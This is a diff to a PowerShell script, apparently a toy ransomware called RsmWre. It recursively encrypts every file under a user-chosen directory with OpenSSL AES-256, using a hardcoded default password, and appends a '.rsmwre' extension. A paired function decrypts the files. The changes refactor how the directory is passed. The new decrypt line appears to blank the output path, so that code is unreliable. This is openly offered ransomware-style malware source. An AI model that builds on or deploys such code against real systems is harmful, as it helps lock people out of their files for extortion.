@@ -18,33 +18,34 @@ function GetFileScope {
     param (
        [STRING] $Directory = 'C:\'
     )
-   $global:fileScope = (Get-ChildItem -Path $Directory -File -Recurse).FullName
+   $fileScope = (Get-ChildItem -Path $Directory -File -Recurse).FullName
 }
 
 function Encrypt {
     [CmdletBinding()]
     param (
-       [STRING] $Key = '1234'
+       [STRING] $Pswd = '1234',
+       [STRING] $Directory
     )
+    $fileScope = (Get-ChildItem -Path "$Directory" -File -Recurse).FullName
     ForEach ($inFile in $fileScope) {
         Write-Host "Encrypting $inFile ..."
         $outFile = $inFile + '.rsmwre'
-        .\OpenSSL.exe enc -aes-256-cbc -in $inFile -out $outFile -k $Key
+        .\OpenSSL.exe enc -k $Pswd -aes-256-cbc -e -in $inFile -out $outFile
         Write-Host "Done."
     }
 }
 function Decrypt {
     [CmdletBinding()]
     param (
-       [STRING] $Key = '1234'
+       [STRING] $Pswd = '1234',
+       [STRING] $Directory
     )
+    $fileScope = (Get-ChildItem -Path "$Directory*.rsmwre" -File -Recurse).FullName
     ForEach ($inFile in $fileScope) {
         Write-Host "Decrypting $inFile ..."
-        $FileName = Split-Path $inFile -Leaf
-        $Extension = $FileName.Split('.') | Select-Object -Last 1
-        $FileNameWoExt = $FileName.Substring(0, $FileName.Length - $Extension.Length - 1)
-        $outFile = $FileNameWoExt
-        .\OpenSSL.exe enc -d -aes-256-cbc -in $inFile -out $outFile -k $Key
+        $outFile = $inFile -replace ".*.rsmwre"
+        .\OpenSSL.exe enc -k $Pswd -aes-256-cbc -d -in $inFile -out $outFile
         Write-Host "Done."
     }
 }
@@ -54,15 +55,16 @@ function RsmWre {
         [STRING] $Action
     )
     IF ($Action -eq "Encrypt") {
-        Encrypt
+        Encrypt -Directory $Directory
     }
     ELSEIF ($Action -eq "Decrypt") {
-        Decrypt
+        Decrypt -Directory $Directory
     }
     ELSE {
         Write-Error -Message "You did not supply a proper value for function RsmWre"
     }
 }
-
-$Directory = Read-Host -Prompt "Enter target directory"
 $Action = Read-Host -Prompt "Enter action type"
+$global:Directory = Read-Host -Prompt "Enter directory"
+
+RsmWre -Action $Action
